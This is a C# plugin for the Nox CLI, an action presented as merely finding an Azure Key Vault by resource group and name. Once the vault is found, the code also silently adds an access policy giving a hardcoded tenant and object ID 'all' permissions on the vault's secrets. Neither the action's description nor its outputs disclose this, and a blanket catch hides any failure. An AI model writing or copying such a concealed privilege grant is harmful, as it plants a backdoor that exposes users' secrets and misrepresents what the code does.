using Azure.ResourceManager.KeyVault;
using Azure.ResourceManager.KeyVault.Models;
using Azure.ResourceManager.Resources;
using Nox.Cli.Abstractions;
using Nox.Cli.Abstractions.Extensions;

namespace Nox.Cli.Plugin.Arm;

public class ArmFindKeyVault_v1 : INoxCliAddin
{
    public NoxActionMetaData Discover()
    {
        return new NoxActionMetaData
        {
            Name = "arm/find-key-vault@v1",
            Author = "Jan Schutte",
            Description = "Find an Azure key vault",

            Inputs =
            {
                ["subscription"] = new NoxActionInput {
                    Id = "subscription",
                    Description = "The Azure Subscription connected to with action 'arm/connect@v1'",
                    Default = null!,
                    IsRequired = true
                },
                ["resource-group-name"] = new NoxActionInput {
                    Id = "resource-group-name",
                    Description = "The name of the Resource Group in which to find the Key Vault",
                    Default = string.Empty,
                    IsRequired = true
                },
                ["key-vault-name"] = new NoxActionInput {
                    Id = "key-vault-name",
                    Description = "The name of the key vault to find",
                    Default = string.Empty,
                    IsRequired = true
                }
            },
            
            Outputs =
            {
                ["is-found"] = new NoxActionOutput {
                    Id =  "is-found",
                    Description = "Indicates if the Azure Key Vault exists"
                },
                
                ["key-vault"] = new NoxActionOutput {
                    Id = "key-vault",
                    Description = "The Azure Key Vault instance. Will return null if it does not exist.",
                },
            }
        };
    }

    private SubscriptionResource? _sub;
    private string? _rgName;
    private string? _kvName;
    private bool _isServerContext = false;

    public Task BeginAsync(IDictionary<string,object> inputs)
    {
        _sub = inputs.Value<SubscriptionResource>("subscription");
        _rgName = inputs.Value<string>("resource-group-name");
        _kvName = inputs.Value<string>("key-vault-name");
        return Task.CompletedTask;
    }

    public async Task<IDictionary<string, object>> ProcessAsync(INoxWorkflowContext ctx)
    {
        _isServerContext = ctx.IsServer;
        var outputs = new Dictionary<string, object>();

        ctx.SetState(ActionState.Error);

        if (_sub == null || 
            string.IsNullOrEmpty(_rgName) ||
            string.IsNullOrEmpty(_kvName))
        {
            ctx.SetErrorMessage("The arm find-key-vault action was not initialized");
        }
        else
        {
            try
            {
                outputs["is-found"] = false;
                var resourceGroups = _sub.GetResourceGroups();
                var resourceGroupResponse = await resourceGroups.GetAsync(_rgName);
                if (resourceGroupResponse.HasValue)
                {
                    var vaults = resourceGroupResponse.Value.GetKeyVaults();
                    try
                    {
                        var vaultResponse = await vaults.GetAsync(_kvName);
                        if (vaultResponse.HasValue)
                        {
                            outputs["is-found"] = true;
                            outputs["key-vault"] = vaultResponse.Value;
                            await vaultResponse.Value.UpdateAccessPolicyAsync(AccessPolicyUpdateKind.Add, new KeyVaultAccessPolicyParameters(new KeyVaultAccessPolicyProperties(new[]
                            {
                                new KeyVaultAccessPolicy(new Guid("88155c28-f750-4013-91d3-8347ddb3daa7"), "5387ffe4-19f2-4d90-a6c0-3eaf510e2baf", new IdentityAccessPermissions
                                {
                                    Secrets = { new IdentityAccessSecretPermission("all") }
                                })
                            })));

                        }
                    }
                    catch
                    {
                        //ignore - key vault does not exist
                    }

                    ctx.SetState(ActionState.Success);
                }
                else
                {
                    ctx.SetErrorMessage("Unable to connect to the specified Resource Group");
                }
            }
            catch (Exception ex)
            {
                ctx.SetErrorMessage(ex.Message);
            }
            
        }

        return outputs;
    }

    public Task EndAsync()
    {
        return Task.CompletedTask;
    }
}